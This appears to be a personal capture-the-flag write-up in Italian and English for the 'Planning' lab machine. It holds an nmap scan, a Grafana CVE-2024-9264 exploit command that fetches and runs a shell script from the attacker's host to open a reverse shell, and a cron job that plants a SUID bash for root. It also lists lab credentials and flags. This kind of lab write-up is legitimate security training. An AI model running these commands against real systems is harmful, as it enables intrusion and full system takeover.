# Planning

ip address: 10.10.11.68

## machine informations
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

# NMAP

Nmap scan report for 10.10.11.68
Host is up (1.4s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/16%OT=22%CT=1%CU=38818%PV=Y%DS=2%DC=I%G=Y%TM=6827
OS:465C%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z)SEQ(S
OS:P=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II
OS:=I%TS=C)OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7
OS:%O5=M542ST11NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=N)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 460.10 seconds

# Exploiting

c'è il sito -> lo analizzo e mi scarico i sorgenti con wget.

enum con ffuf -> trovo un sottodominio: grafana.planning.htb

Accedo con le credenziali date dalle info della macchina

cerco CVE per grafana -> https://github.com/nollium/CVE-2024-9264.git

Creo il file shell.sh sulla porta e avvio la reverse shell:

1. python server sulla 8000
2. nc -lvnp 1337
3. python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.23:8000/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh" http://grafana.planning.htb


una volta dentro mmi accorgo di essere in un container. Faccio env e ottengo le credenziali dell'admin

> enzo
> RioTecRANDEntANT!

mi connetto in ssh: 
> ssh enzo@10.10.11.68 

# USER FLAG

879e7309048ddcb7fabde978b10a3819


# PRIVESC

- cat /opt/crontabs/crontab.db

mi segno la password trovata -> root:P4ssw0rdS0pRi0T3c

- netstate -tulpn

la 8000 è aperta -> port forwarding per accedere ai crontabs:

ssh -L 8000:127.0.0.1:8000 enzo@planning.

accedo con quelle di prima

una volta entrato -> accedo ai crontab da google in localhost:8000, 

creo un nuovo crontab che sposta bin bash e gli assegna il SUID:

cp /bin/bash /tmp/bash && chmod u+s /tmp/bash

eseguo con /tmp/bash -p

# ROOT FLAG
2fdb444285c2a603c46e211bf963ea67